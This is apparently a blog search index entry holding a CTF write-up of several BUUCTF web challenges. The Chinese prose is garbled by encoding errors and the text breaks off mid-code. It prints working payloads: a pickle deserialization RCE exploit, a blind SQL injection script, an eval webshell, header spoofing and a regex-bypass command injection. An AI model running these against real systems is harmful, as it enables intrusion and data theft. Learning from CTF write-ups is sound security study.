<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF-web-ç¬¬ä¸‰é¡µwpåˆ†äº«</title>
    <link href="/2022/01/28/BUUCTF-web-%E7%AC%AC%E4%B8%89%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <url>/2022/01/28/BUUCTF-web-%E7%AC%AC%E4%B8%89%E9%A1%B5wp%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>ä¸€çœ¼xxe å¤§æ¦‚ä¼šå­˜åœ¨ <code>&lt;a&gt;1&lt;/a&gt;&lt;b&gt;2&lt;/b&gt;</code> è¿™æ ·çš„å­—æ®µ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191818297.png" alt="image-20220119181833147"></p><p>å‘ç°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æ³•è¯»å– /flag</p><p>ç„¶åè¯»å– <code>/proc/net/arp</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191825675.png" alt="image-20220119182518576"></p><p>è¯»å–åˆ°ä¸€ä¸ªå†…ç½‘ipå°è¯•è¿›è¡Œå†…ç½‘ä¸»æœºæ¢æ´»</p><p>â€¦æ²¡å¼„å‡ºæ¥ï¼Œä½†æ˜¯ä»¥å‰åšå‡ºæ¥è¿‡è´´ä¸ªå›¾å‡è£…è‡ªå·±åšå‡ºæ¥äº†</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191851452.png" alt="image-20220119185119404"></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>é¦–é¡µphpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];   <span class="hljs-comment">//ä¼ å‚å­—ç¬¦ä¸²</span><br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br><br></code></pre></td></tr></table></figure><p>phpç»å…¸ç‰¹æ€§äº† . [ å¯ä»¥è¢«è§£æä¸ºä¸‹åˆ’çº¿ã€‚ç¬¬äºŒä¸ªifå¯ä»¥åŠ ä¸€ä¸ª%0a </p><p>æœ‰ ?b.u.p.t=23333%0a</p><p>ç¬¬äºŒå…³æç¤ºæœ¬åœ°è®¿é—®ï¼Œè¿™é‡Œç»™å¼„ä¸Š client-ip:127.0.0.1 è¿™é‡Œå› ä¸ºxffè¢«banäº†ï¼Œå‰æ®µæ—¶é—´åˆšå¥½çœ‹äº†çœ‹phpè·å–ipï¼Œremote-addræ²¡å‡†ä¹Ÿè¡Œ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191928432.png" alt="image-20220119192836325"></p><p>ç„¶åç»™å‡ºäº†ä¸€æ®µbranckfuckè¿˜æ˜¯jsfuckæˆ‘è®°ä¸å¤ªæ¸…äº†ï¼Œçè¯•è¯• ohï¼Œjsfuck</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191930230.png" alt="image-20220119193046181"></p><p>è¿™é‡Œæœ‰ä¸€ç‚¹ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆæˆ‘burpé‡ŒåŠ ä¸Šäº†POSTæ•°æ®æ²¡æˆåŠŸ ä½†æ˜¯åœ¨æµè§ˆå™¨é‡ŒæˆåŠŸäº†â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    highlight_file(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = base64_decode(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= chr ( ord (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = getIp();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> file_get_contents(change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç›®çš„æ˜¯æ‰§è¡Œåˆ°27è¡Œï¼Œæˆ‘ä»¬éœ€è¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )  <span class="hljs-comment">//client-ip:127.0.0.1 + phpdataä¸ºåè®®</span><br>    ...<br>    change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) <span class="hljs-comment">//è¯»å–å†…å®¹æ˜¯flag.php </span><br></code></pre></td></tr></table></figure><p>åç€æä¸€ä¸‹changeå‡½æ•°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191954768.png" alt="image-20220119195433701"></p><p>åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆvscodeå†™ä»£ç è¦åœ¨terminalé‡Œé¢è·‘ï¼Œæœ‰ä¸ªå¼±æ™ºæ¸¸æˆç»™æˆ‘æ³¨å†Œè¡¨æ”¹äº†ğŸ¤¦â€â™‚ï¸å°±å¾ˆéš¾åœ¨vscodeä¸Šè·‘ä»£ç </p><p>æœ€åæ„é€ å¦‚ä¸‹httpæ•°æ®åŒ…å³å¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secrettw.php?2333=data:text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>client-ip:127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>æ— å­—æ¯æ— æ•°å­—shellï¼Œè¿™é‡Œå°±æ˜¯å–åå°±è¡Œäº†</p><p>æˆ‘å°è¯•æ„é€  <code>system(&#39;cat /*&#39;)</code> ä½†æ˜¯æ²¡æœ‰ç»“æœ oh åŸæ¥æ˜¯è¢«banäº†</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192017105.png" alt="image-20220119201731043"></p><p>æ„å»ºä¸€ä¸ªğŸ <code>assert(eval($_POST[1]))</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192018089.png" alt="image-20220119201801977"></p><p>æˆåŠŸæ‰§è¡Œ</p><p>ä¹‹åç”¨èšå‰‘è¿æ¥å‘ç°å¾ˆå¤šå†…å®¹è¯»å–ä¸äº†ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºdisable_functionç¦ç”¨çš„å‡½æ•°å¤ªå¤šäº†ï¼Ÿ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192021868.png" alt="image-20220119202132814"></p><p>ç”¨èšå‰‘çš„æ’ä»¶ </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192023147.png" alt="image-20220119202345087"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192023016.png" alt="image-20220119202305970"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>é˜¿è¿™é˜¿è¿™</p><p>æ²¡æ†‹å‡ºæ¥ï¼Œä½†æ˜¯çœ‹åˆ«äººwpï¼Œå°±åœ¨httpæ•°æ®åŒ…æ·»åŠ  <code>Cookie: username=admin</code> å°±è¡Œ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192028004.png" alt="image-20220119202827945"></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>æ‰¾é‚£ä¸ªé’±æ•°çš„é¡µé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://0faf2455-bd00-4dbc-bda1-46e8fb482dd4.node4.buuoj.cn:81/shop?page=&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">1</span>):<br>    res=requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè´­ä¹°çš„è¯æé†’æˆ‘å»ç™»å½• é‚£å°±å»å¼„ä¸€ä¸ªè´¦æˆ·</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282219868.png" alt="image-20220119212823902"></p><p>è´¦æˆ·ä½™é¢ 1000 æ˜¾ç„¶å¤Ÿä¸ä¸Šéœ€è¦çš„é‡‘é¢</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192130119.png" alt="image-20220119213016047"></p><p>å‘ç°æœ‰ä¸ªjwtï¼Œèƒ½ä¸èƒ½æ›¿æ¢æˆadminçš„ç„¶åç›´æ¥ä¹°è¿™ä¸ªäº§å“ï¼Ÿ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192137846.png" alt="image-20220119213709772"></p><p>æœ‰åŠ å¯†ï¼Œç”¨jwtcrackè·‘ä¸€ä¸‹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192150019.png" alt="image-20220119215049957"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192152020.png" alt="image-20220119215203952"></p><p>æ›¿æ¢ç®­å¤´å†…å†…å®¹ä¸ºè‡ªå·±æƒ³è¦çš„å†…å®¹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192154115.png" alt="image-20220119215432035"></p><p>æ”¹æ‰åŸå…ˆçš„jwtï¼Œç„¶ååˆ·æ–°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ˜¯admin1äº† æŸ¥çœ‹ä¸€ä¸‹hint</p><p>è§£ç ç»“æœï¼šè¿™ç½‘ç«™ä¸ä»…å¯ä»¥ä»¥è–…ç¾Šæ¯›ï¼Œæˆ‘è¿˜ç•™äº†ä¸ªåé—¨ï¼Œå°±è—åœ¨lv6é‡Œ ä¸æ˜¯è¿™ä¸ªåœ°æ–¹ä¸çŸ¥é“å¤§å®¶å“ªé‡Œçš„è·å¾—æºç æˆ‘ä¸€ç›´ä¹Ÿæ²¡çœ‹æ‡‚</p><p>åœ¨ /b1g_m4mber è¿™é‡Œæç¤ºæœ‰<a href="http://www.zipçš„æºç æ³„éœ²/">www.zipçš„æºç æ³„éœ²</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192219375.png" alt="image-20220119221907308"></p><p>æŸ¥çœ‹æºç ï¼Œæœæœloads è¿™ä¸ªpicklä¸ä»…åœ¨é¢˜ç›®ä¸Šä½“ç°äº†ï¼Œåœ¨æ•°æ®åŒ…ä¹Ÿæœ‰æ‰€ä»¥</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192227727.png" alt="image-20220119222742651"></p><p>ç„¶åæ„å»ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ›¿æ¢postä¸Šå»çš„becomeå˜é‡</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192234014.png" alt="image-20220119223422932"></p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>å¯ä»¥å¯ä»¥å¼‚æˆ–æ³¨å…¥ï¼Œç›´æ¥å«–äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><br>url= <span class="hljs-string">&#x27;http://3d16e7a7-6339-454c-9fd4-a9b28f29b4f5.node4.buuoj.cn:81/&#x27;</span><br><br>database =<span class="hljs-string">&quot;&quot;</span><br><br>payload1 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#åº“åä¸ºctf</span><br>payload2 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span><span class="hljs-comment">#è¡¨åä¸ºflag,score</span><br>payload3 =<span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#åˆ—åä¸ºflag,value</span><br>payload4 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid =(low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        <span class="hljs-comment"># payload = payload1.format(i,mid)  #æŸ¥åº“å</span><br>        <span class="hljs-comment"># payload = payload2.format(i,mid)  #æŸ¥è¡¨å</span><br>        <span class="hljs-comment"># payload = payload3.format(i,mid)  #æŸ¥åˆ—å</span><br>        payload = payload4.<span class="hljs-built_in">format</span>(i,mid) <span class="hljs-comment">#æŸ¥flag</span><br><br>        new_url = url + payload<br>        r = requests.get(new_url)<br>        <span class="hljs-built_in">print</span>(new_url)<br>        sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hi admin, your score is: 100&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) //<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> (mid == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">132</span>):<br>        <span class="hljs-keyword">break</span><br>    database +=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><br><span class="hljs-built_in">print</span>(database)   <span class="hljs-comment"># æ¥æºhttps://blog.csdn.net/SopRomeo/article/details/106148254</span><br><span class="hljs-comment">#è®°å¾—åŠ sleepå—· è¦ä¸flagå¾ˆå¯èƒ½æ˜¯é”™çš„</span><br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>ç»™äº†æç¤ºEnter command as JSON</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œå°äº†å¥½å¤šå‘½ä»¤æ²¡åšä¸‹å»ï¼Œç„¶åç½‘ä¸Šæ‰¾åˆ°äº†æºç å¯èƒ½æ˜¯æ¯”èµ›çš„æ—¶å€™ç»™äº†ä½†æ˜¯è¿™é‡Œæ²¡æœ‰ç»™å‡ºæŠŠ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!is_string(<span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = json_decode(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      system(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªæºç å¯ä»¥æ¨æµ‹å½“å‰ç”¨æˆ·ä¸ºrceservice /home/rceservice/</p><p>è¿™ä¸ªpreg_matchå¯ä»¥ç”¨%0aæˆ–è€…æœ€å¤§å›æº¯æ•°ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?cmd=%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;<br></code></pre></td></tr></table></figure><p>PHPç‚ºé˜²æ­¢DOSï¼Œè¨­å®šäº†PCREå›æº¯æ¬¡æ•¸ä¸Šé™,é è¨­ç‚º1000000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 